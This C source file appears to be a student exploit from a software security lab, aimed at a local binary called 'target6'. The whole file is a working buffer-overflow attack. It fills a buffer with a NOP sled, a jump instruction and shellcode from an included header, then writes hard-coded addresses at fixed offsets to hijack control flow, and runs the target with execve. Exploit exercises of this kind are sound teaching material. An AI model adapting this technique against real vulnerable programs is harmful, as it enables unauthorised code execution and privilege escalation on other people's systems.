#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target6"
#define LENGTH 192

int main(void)
{
  char *args[3];
  char *env[1];

  // Start
  char buf[LENGTH];

  // Fill up the buffer with NOP
  for (int i = 0; i < 192; i++) {
      buf[i] = '\x90';
  }

  buf[0] = '\xeb';
  buf[1] = '\x05'; // This should be the jump distance
  buf[2] = '\x01';
  buf[3] = '\x01';

  // Pad the first 3 bytes
  buf[4] = '\x01';
  buf[5] = '\x01';
  buf[6] = '\x01';

  for(int i = 0; i < strlen(shellcode); i++){
		buf[7 + i] = shellcode[i];
	}

  buf[72] = '\x48';
  buf[73] = '\xec';
  buf[74] = '\x04';
  buf[75] = '\x01';

  buf[76] = '\xa8';
  buf[77] = '\xfe';
  buf[78] = '\x21';
  buf[79] = '\x30';

  buf[191] = '\x00';

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
